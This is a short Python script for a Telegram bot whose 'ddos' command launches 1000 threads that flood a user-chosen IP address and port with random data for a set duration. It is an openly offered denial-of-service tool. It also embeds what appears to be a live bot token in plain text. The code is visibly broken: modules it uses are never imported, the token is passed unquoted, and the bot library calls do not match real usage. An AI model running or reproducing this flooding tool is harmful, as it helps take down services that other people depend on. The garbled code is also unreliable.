import socket
import threading
import requests
from python_telegram_bot import Bot, ChatAction

TOKEN = "7446815655:AAEopVY4VbqjCM5mcJsoxWclmXH2O-p1n3o"
bot = Bot(7446815655:AAEopVY4VbqjCM5mcJsoxWclmXH2O-p1n3o)

def attack(target_ip, port, duration):
    start_time = int(time.time())
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            s.connect((target_ip, port))
            s.send(random._urandom(1024))
            s.sendto(random._urandom(1024), (target_ip, port))
            s.send(random._urandom(1024))
            s.close()
            print(f"Sent 1024 bytes to {target_ip}:{port}")
            if int(time.time()) - start_time >= duration:
                break
        except Exception as e:
            print(f"Error: {e}")

@bot.command("ddos")
def ddos(update, args):
    target_ip = args[0]
    port = int(args[1])
    duration = int(args[2])
    for i in range(1000):
        t = threading.Thread(target=attack, args=(target_ip, port, duration))
        t.start()
    bot.send_message(update.chat_id, f"DDOS attack is running for {duration} seconds...")

bot.start_polling()